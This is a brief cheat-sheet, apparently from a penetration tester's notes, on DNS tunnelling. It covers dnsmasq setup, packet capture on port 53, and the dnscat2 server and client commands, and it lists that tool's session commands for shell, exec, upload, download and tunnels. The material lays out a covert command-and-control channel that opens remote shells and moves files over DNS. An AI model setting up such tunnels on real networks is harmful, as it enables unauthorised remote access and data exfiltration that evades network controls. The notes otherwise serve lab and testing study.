# DNS Tunnelling

[[DNS]] Tunnelling


Beware the `dnsmasq.conf` read carefully and understand what is defined and if the  configuration ignores `/etc/hosts` or `/etc/resolv.conf  
```
sudo dnsmasq -C dnsmasq.conf -d
resolvectl status
```

```
sudo tcpdump -i ens192 udp port 53
```

```bash
nslookup -type=txt $domain
```

`dnscat2`
```bash
dnscat2-server $domain
# press [RETR] after message: `Of course, you have to figure out the server yourself! Clients will connect directly on UDP 53.
# The prompt will be displayed as written below, which accept commands
dnscat2>
# List all active windows
dnscat2> windows
# Interactive with a window
dnscat2> window -i $number
# Command session.. and running the `help` command
comand ($hostThatRanClient) 1> help
Here is a list of commands (use -h on any of them for additional help):
* clear
* delay
* download
* echo
* exec
* help
* listen
* ping
* quit
* set
* shell
* shutdown
* suspend
* tunnels
* unset
* upload
* window
* windows

```

From  the client
```bash
./dnscat $domain
```